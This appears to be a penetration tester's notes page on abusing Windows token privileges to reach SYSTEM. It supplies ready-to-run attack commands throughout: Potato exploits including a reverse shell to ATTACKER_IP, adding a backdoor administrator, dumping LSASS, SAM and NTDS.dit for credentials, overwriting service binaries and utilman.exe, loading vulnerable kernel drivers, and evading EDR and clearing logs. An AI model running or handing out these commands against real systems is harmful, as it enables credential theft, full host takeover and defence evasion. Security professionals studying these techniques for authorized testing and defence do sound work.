+++
title = 'Excessive User Rights Abuse'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['windows', 'privilege-escalation', 'tokens', 'privileges']
+++

Windows token privileges are the **most direct path to SYSTEM** on a compromised host. A web shell on an IIS server or a SQL Server `xp_cmdshell` almost always lands in a context holding `SeImpersonatePrivilege` — and a single command turns that into `NT AUTHORITY\SYSTEM`. This file covers each high-value privilege, the tools to abuse it, and the defenses you must bypass on modern Windows (2025–2026).

---

## 0. Triage — Which Privilege Do I Have?

Run this immediately after landing a shell:

```cmd
whoami /priv
```

| Privilege | Primitive | Primary Tool | Payoff |
|---|---|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | Coerce a SYSTEM token from a service | **SigmaPotato**, **GodPotato**, **PrintSpoofer** | `NT AUTHORITY\SYSTEM` |
| **SeDebug** | Open any process | **PPLdump**, **WerFaultSecure**, **AxiomDumper** | LSASS dump → credentials / SYSTEM |
| **SeTakeOwnership** | Own any object → rewrite DACL | `takeown` + `icacls` | Arbitrary write → SYSTEM |
| **SeBackup** | Read any file (bypass DACL) | `reg save`, `robocopy /B`, **UnderlayCopy BOF** | SAM/SYSTEM/NTDS.dit → domain hashes |
| **SeRestore** | **Write any file** (bypass DACL) | `robocopy /B`, PowerShell restore API | Arbitrary write → SYSTEM |
| **SeLoadDriver** | Load a kernel driver | **EoPLoadDriver** + vulnerable driver | Kernel R/W → SYSTEM |
| **SeSecurity** | Read/clear Security log | `wevtutil` | Credential harvesting (not direct root) |

> **Key insight:** `whoami /priv` often shows these privileges as **Disabled**. This does **not** mean they are unavailable. Any process can call `AdjustTokenPrivileges` to enable them at runtime, and exploitation tools do this automatically.

---

## 1. SeImpersonate & SeAssignPrimaryToken — The Potato Family

> These privileges let a process **impersonate a token** it can obtain a handle to. A privileged service can be coerced into connecting to the exploit process and handing over its **SYSTEM token**. Service accounts — IIS AppPool identities, `MSSQL$`, `gMSA` — hold these by default, making a web or SQL shell a SYSTEM shell away.

### 1.1 Confirm and restore the privilege

```cmd
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

If the token is **filtered** (common on `LOCAL SERVICE` / `NETWORK SERVICE`), recover the default privilege set first with **FullPowers**, then run the Potato:

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
```

`FullPowers` restores `SeAssignPrimaryToken` and `SeImpersonate` on service-account tokens that have been stripped.

### 1.2 Choosing the right Potato (2025–2026)

| Tool | OS support | Notes |
|---|---|---|
| **SigmaPotato** | Windows 8 → 11 / Server 2012 → 2025 | **Modern default.** GodPotato fork with RPC hooking and DCOM unmarshalling; supports in-memory / .NET reflection — better against EDR |
| **GodPotato** | Server 2012–2022 / Win 8–11 | Broad compatibility; the established fallback |
| **PrintSpoofer** | Win 10 / Server 2016–2019 | Requires the **Print Spooler** running; abuses the spooler’s named pipe |
| **RoguePotato** | Server 2019+ | Requires an OXID resolver reachable on **TCP/135** |
| **SharpEfsPotato / EfsPotato** | 1809+ / Server 2019+ | MS-EFSR coercion; works when outbound 135 is blocked |
| **DCOMPotato** | Server 2019+ | DCOM-based coercion alternative |
| **CrystalPotato** | Win 10 / 11 / Server 2025 | Crystal port of GodPotato with **indirect syscalls** and compile-time string obfuscation — stealth-focused |
| **DeadPotato** | Modern Windows | Customized GodPotato fork for `SeImpersonate` |
| **JuicyPotato** | **≤ Server 2016 / Win10 < 1809 only** | Dead on 1809+; BITS CLSID |

**Decision rule:**

- **1809+ / Server 2019+** → **SigmaPotato** or **GodPotato** first.
- **Print Spooler running** → **PrintSpoofer** is the classic reliable path.
- **Outbound 135 allowed** → **RoguePotato**.
- **135 blocked** → **EfsPotato**.
- **EDR present** → **SigmaPotato** (in-memory) or **CrystalPotato** (indirect syscalls) before a disk-based binary.
- **Spooler disabled** → **DCOMPotato** or **SharpEfsPotato**.

### 1.3 Worked examples

```cmd
:: SigmaPotato — modern universal
.\SigmaPotato.exe --revshell ATTACKER_IP 4444

:: GodPotato — broad compatibility
.\GodPotato.exe -cmd "cmd /c net localgroup administrators pwn /add"

:: PrintSpoofer — requires Spooler
.\PrintSpoofer.exe -i -c cmd

:: RoguePotato — requires outbound 135 to the attacker OXID resolver
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c <payload>" -l 9999

:: EfsPotato
.\EfsPotato.exe "whoami"

:: CrystalPotato — indirect syscalls
.\CrystalPotato.exe -c "cmd /c whoami"
```

> **Detection note:** Classic Potato binaries are signatured. **SigmaPotato** and **CrystalPotato** are explicitly designed to reduce userland telemetry and evade static signatures.

---

## 2. SeDebugPrivilege — LSASS Dumping and Process Injection

> `SeDebugPrivilege` lets a token **open a handle to any process**, including protected ones. It is the privilege that turns a local admin into a credential thief.

### 2.1 Confirm the privilege

```cmd
whoami /priv | findstr /i "SeDebug"
```

### 2.2 Dump LSASS — the classic path

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

Then parse offline:

```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
```

**Built-in alternative** (often still flagged but no external binary):

```cmd
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump <lsass_pid> C:\Temp\lsass.dmp full
```

> **Use the PID, not the name:** `tasklist /fi "imagename eq lsass.exe"`.

### 2.3 When SeDebug is not enough — RunAsPPL and Credential Guard

**LSA Protection (`RunAsPPL`)** launches LSASS as a **Protected Process Light**. The kernel refuses `PROCESS_VM_READ` to any caller that is not itself a protected process of equal or higher rank. **Administrator rights do not change that. `SeDebugPrivilege` does not change that**.

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

If `RunAsPPL = 1`, `procdump` and `comsvcs` fail with **access denied**. You need a **PPL bypass**:

| Technique | How it works | Tool |
|---|---|---|
| **PPLdump / PPLMedic** | KnownDlls + `DefineDosDevice` trick to promote a userland process to PPL via DLL-loading hijacking | `ppldump` |
| **WerFaultSecure** | Abuses the Windows Error Reporting secure process to dump LSASS despite PPL (2026 technique) | Custom PoC |
| **Vulnerable signed driver** | A kernel driver with a handle-leak or arbitrary-write primitive strips PPL from LSASS | **AxiomDumper**, **CredsHunter (CVE-2026-3609)** |
| **Handle leak in anti-cheat driver** | `xhunter1.sys` exposes `ObOpenObjectByPointer` via IOCTL → PPL bypass | CredsHunter |

**Credential Guard** goes further: it moves secrets into a **hardware-isolated VBS enclave**. Even a successful LSASS dump will not yield NTLM hashes or Kerberos keys — they are simply not in LSASS memory.

```powershell
# Check Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

**Credential Guard bypass (2025–2026):** requires SYSTEM-level access to manipulate LSASS memory flags (`UseLogonCredential`, `IsCredGuardEnabled`) and restore cleartext credential caching. **DumpGuard** (2026) targets fully patched Windows 11 and Server 2025 by abusing Remote Credential Guard interfaces and LSA authentication packages to obtain Kerberos-derived artifacts and NTLM challenge responses.

> **Bottom line:** On a modern hardened host, `SeDebugPrivilege` alone is no longer sufficient for LSASS dumping. You must first determine whether `RunAsPPL` or Credential Guard is active, then choose a PPL bypass or a non-LSASS credential path (DPAPI, SAM, browser stores, Event Log Readers).

### 2.4 SeDebug → SYSTEM via process injection

If LSASS is protected, `SeDebug` can still inject into a **SYSTEM process**:

```powershell
Import-Module .\psgetsys.ps1
ImpersonateFromParentPid -ppid (Get-Process "winlogon").Id -command "C:\Tools\revshell.exe"
```

---

## 3. SeTakeOwnershipPrivilege — Indirect Arbitrary Write

> `SeTakeOwnershipPrivilege` lets a token **take ownership of any securable object without being granted access first**. Once you own an object, you can **rewrite its DACL** to grant yourself full control. This is an **indirect arbitrary-write primitive**: own → grant → overwrite → trigger.

### 3.1 Confirm and take ownership

```cmd
whoami /priv | findstr /i "SeTakeOwnership"

takeown /f "C:\Program Files\Vuln Service\service.exe"
icacls "C:\Program Files\Vuln Service\service.exe" /grant %USERNAME%:F
```

### 3.2 Exploitation — replace a SYSTEM-executed binary

```cmd
copy /y C:\Windows\Temp\payload.exe "C:\Program Files\Vuln Service\service.exe"
sc stop VulnService & sc start VulnService
```

The primitive is identical for **any file SYSTEM executes** — a service binary, a scheduled-task program, or a DLL in a privileged load path. A frequently used variant targets `utilman.exe` or `sethc.exe` at the logon screen.

> **Key distinction:** `SeTakeOwnership` is a **two-step** process (own, then grant). `SeRestorePrivilege` (Section 5) is a **one-step arbitrary write** — if you have it, you can skip the ownership dance entirely.

---

## 4. SeBackupPrivilege — Read Any File

> `SeBackupPrivilege` lets a process open any file with `FILE_FLAG_BACKUP_SEMANTICS` and **skip the DACL check**. It is the read-side counterpart to `SeRestorePrivilege`.

### 4.1 Confirm membership and privilege

```cmd
whoami /priv | findstr /i "SeBackup"
```

> **Important:** `whoami /priv` often shows the privilege as **Disabled**. This does not mean it is unavailable — exploitation tools enable it at runtime.

### 4.2 Dump SAM / SYSTEM / SECURITY (local machine)

```cmd
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save
reg save hklm\security C:\Temp\security.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### 4.3 NTDS.dit (Domain Controller)

**Method A — `diskshadow` + `robocopy /B` (classic):**

```cmd
diskshadow.exe
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% Z:
```

```cmd
robocopy /b Z:\Windows\NTDS C:\Temp NTDS.dit
reg save hklm\system C:\Temp\system.save
```

```bash
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

> **`robocopy /b` requires both `SeBackup` and `SeRestore`.** If you only have `SeBackup`, use `reg save` and the `SeBackupPrivilege` PowerShell cmdlets.

**Method B — UnderlayCopy BOF (2026, stealthy):**

**UnderlayCopy** is a Havoc BOF that copies locked Windows files (`SAM`, `SYSTEM`, `NTDS.dit`) via **raw MFT parsing** — no VSS, no Registry APIs, no PowerShell. It enables `SeBackupPrivilege` via `NtAdjustPrivilegesToken` and reads the NTFS disk sectors directly, bypassing VSS and API-call logging.

```
stealthcopy C:\Windows\NTDS\NTDS.dit C:\Temp\out.dit
```

This is significantly stealthier than `diskshadow`, which generates VSS events and is monitored by most EDRs.

**Method C — NetExec module:**

```bash
nxc smb <ip> -u username -p password -M backup_operator
```

---

## 5. SeRestorePrivilege — Write Any File (Direct Arbitrary Write)

> `SeRestorePrivilege` lets a token **bypass file, directory, registry, and other persistent object permissions when restoring backed-up files**. It is the **write-side counterpart** to `SeBackup` and is a **direct arbitrary-write primitive** — no ownership step required.

### 5.1 Confirm the privilege

```cmd
whoami /priv | findstr /i "SeRestore"
```

### 5.2 Exploitation — overwrite a SYSTEM-executed binary

```cmd
:: Backup the original first
copy C:\Windows\System32\utilman.exe C:\Temp\utilman.exe.bak

:: Overwrite with cmd.exe using restore semantics
:: (robocopy /B often works when both SeBackup and SeRestore are present)
robocopy /B C:\Windows\System32\ C:\Windows\System32\ /xf * /COPY:DT /DCOPY:T

:: Or use a PowerShell script that enables the privilege and calls CopyFile with restore flags
```

Then trigger it at the logon screen (Accessibility button) or restart a service whose binary you replaced.

> **Key insight:** `SeRestorePrivilege` is **more powerful** than `SeTakeOwnership` because it is a **one-step write** — you do not need to take ownership or rewrite a DACL first. If `whoami /priv` shows `SeRestore`, go straight to overwriting a service binary or `utilman.exe`.

---

## 6. SeLoadDriverPrivilege — BYOVD to Kernel R/W

> `SeLoadDriverPrivilege` lets a token **load a kernel-mode driver**. Because kernel code runs at the highest privilege level, loading a **vulnerable signed driver** (a **BYOVD** attack) hands you an arbitrary kernel read/write primitive that trivially escalates to SYSTEM.

### 6.1 Confirm the privilege

```cmd
whoami /priv | findstr /i "SeLoadDriver"
```

> **If the privilege is not visible in an unelevated context, bypass UAC first** — it is present but filtered from the medium-integrity token.

### 6.2 Exploitation — Capcom.sys

```cmd
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys
ExploitCapcom.exe
```

`EoPLoadDriver` registers a driver service under an **HKCU (user-writable) path** — no admin rights to `HKLM\SYSTEM\...\Services` are required. `ExploitCapcom` triggers the vulnerable IOCTL to spawn a **SYSTEM shell**.

### 6.3 Modern BYOVD (2025–2026)

The BYOVD landscape has expanded beyond Capcom.sys. Modern techniques use signed drivers to **disable endpoint protection** before escalating:

- **Silver Fox** (2026) registers a signed BYOVD driver as a kernel service, enables `SeLoadDriverPrivilege`, and loads it via `NtLoadDriver` to shut down endpoint security.
- **BTR Reforged** (Black Hat USA 2026 / DEF CON 34) weaponizes Microsoft Defender’s own `BTR.sys` driver, which **cannot be blocked without disrupting Defender itself**, to tamper with protected security components during early startup.

> **Warning:** Loading a kernel driver can **BSOD the host**. Only do this on a system you own or are explicitly authorized to test.

---

## 7. SeSecurityPrivilege — Audit Log Access

> This privilege determines which users can **specify object access audit options** (SACLs) and **view and clear the Security log** in Event Viewer.

```cmd
whoami /priv | findstr /i "SeSecurity"
```

This is not a direct SYSTEM primitive, but clearing the Security log is a **defense-evasion** step after escalation, and reading it (combined with Event Log Readers membership) is a **credential-harvesting** path — see Section 6 of the Built-in Groups notes.

---

## 8. Quick Reference — Privilege → Tool → Payoff

| Privilege | Confirm | Primary Tool | Edge Case |
|---|---|---|---|
| **SeImpersonate** | `whoami /priv \| findstr Impersonate` | **SigmaPotato**, **GodPotato**, **PrintSpoofer** | Spooler disabled → DCOMPotato; EDR → SigmaPotato/CrystalPotato |
| **SeDebug** | `findstr Debug` | **PPLdump**, **WerFaultSecure**, **AxiomDumper** | `RunAsPPL=1` → PPL bypass needed; Credential Guard → non-LSASS path |
| **SeTakeOwnership** | `findstr TakeOwnership` | `takeown` + `icacls` | Two-step; consider SeRestore instead if available |
| **SeBackup** | `findstr Backup` | `reg save`, `diskshadow` + `robocopy /B`, **UnderlayCopy BOF** | `robocopy /B` needs SeRestore too |
| **SeRestore** | `findstr Restore` | `robocopy /B`, PowerShell restore API | **One-step arbitrary write** — faster than SeTakeOwnership |
| **SeLoadDriver** | `findstr LoadDriver` | **EoPLoadDriver** + Capcom.sys, **Silver Fox** BYOVD | Can BSOD; UAC bypass needed if filtered |

---

## Field Notes

- **`whoami /priv` showing “Disabled” is not a dead end.** All of these privileges can be enabled at runtime; exploitation tools do this automatically.
- **FullPowers is the first step on service accounts.** If `SeImpersonate` is missing from a `LOCAL SERVICE` or `NETWORK SERVICE` token, run `FullPowers.exe -c "cmd /c whoami /priv" -z` before reaching for a Potato.
- **SigmaPotato is the modern default** for `SeImpersonate` — it supports in-memory execution and the widest OS range, making it the best choice against EDR.
- **PrintSpoofer requires the Spooler.** Check `sc query spooler` before using it; if stopped, switch to DCOMPotato or EfsPotato.
- **SeDebug is no longer a guaranteed LSASS dump.** Check `RunAsPPL` and Credential Guard first. If either is active, use a PPL bypass (PPLdump, WerFaultSecure) or a non-LSASS credential path.
- **SeRestore is faster than SeTakeOwnership.** If `whoami /priv` shows `SeRestore`, overwrite a service binary directly — no `takeown` or `icacls` needed.
- **UnderlayCopy BOF is the stealthy SeBackup path.** It avoids VSS events and API-call logging, which `diskshadow` and `robocopy` generate.
- **BYOVD can disable EDR.** Modern BYOVD (Silver Fox, BTR Reforged) is used to turn off endpoint protection *before* escalation, not just to gain kernel R/W.

---

This file sits alongside the **Built-in Groups Abuse** and **Password Attacks** notes: a Backup Operator or Server Operator lands with `SeBackup` or service-reconfiguration rights already present, and an Event Log Reader can harvest the credentials that make `SeImpersonate` reachable in the first place.
